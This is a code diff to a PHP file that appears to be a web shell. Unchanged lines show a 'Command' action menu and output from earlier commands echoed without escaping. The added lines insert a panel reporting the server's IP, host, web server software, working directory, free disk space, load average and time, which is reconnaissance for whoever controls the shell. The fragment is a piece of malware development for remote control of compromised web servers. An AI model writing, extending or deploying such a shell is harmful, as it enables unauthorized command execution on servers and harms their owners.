@@ -127,6 +127,59 @@ body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;c
 if(isset($_GET['msg_text'])) { echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; }
 if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasil Fitur Sebelumnya:</h3><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
 ?>
+ <style>
+  .server-info {
+    font-family: 'Kelly Slab', cursive;
+    font-size: 14px;
+    color: white;
+  }
+  .server-info td {
+    padding: 4px 10px;
+    vertical-align: top;
+  }
+  .label-icon {
+    color: white;
+  }
+  .value {
+    color: <?php echo $theme_fg; ?>;
+  }
+</style>
+
+<table class="server-info">
+  <tr>
+    <td class="label-icon"><i class='fa fa-user'></i> IP Address</td>
+    <td>: <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></td>
+  </tr>
+  <tr>
+    <td class="label-icon"><i class='fa fa-desktop'></i> Host</td>
+    <td>: <span class="value"><?php echo gethostbyname($_SERVER['HTTP_HOST']); ?></span></td>
+  </tr>
+  <tr>
+    <td class="label-icon"><i class='fa fa-cog'></i> Web Server</td>
+    <td>: <span class="value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></td>
+  </tr>
+  <tr>
+    <td class="label-icon"><i class='fa fa-folder-open'></i> Current Path</td>
+    <td>: <span class="value"><?php echo getcwd(); ?></span></td>
+  </tr>
+  <tr>
+    <td class="label-icon"><i class='fa fa-database'></i> Disk Free</td>
+    <td>: <span class="value"><?php echo round(disk_free_space("/") / (1024 * 1024 * 1024), 2); ?> GB</span></td>
+  </tr>
+  <tr>
+    <td class="label-icon"><i class='fa fa-tachometer'></i> Load Avg</td>
+    <td>: <span class="value">
+      <?php
+        $load = sys_getloadavg();
+        echo implode(' ', array_map(fn($v) => number_format($v, 2), $load));
+      ?>
+    </span></td>
+  </tr>
+  <tr>
+    <td class="label-icon"><i class='fa fa-clock-o'></i> Server Time</td>
+    <td>: <span class="value"><?php echo date("d-m-Y H:i:s"); ?></span></td>
+  </tr>
+</table>
 <div class="main-menu">
     <div>
         <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
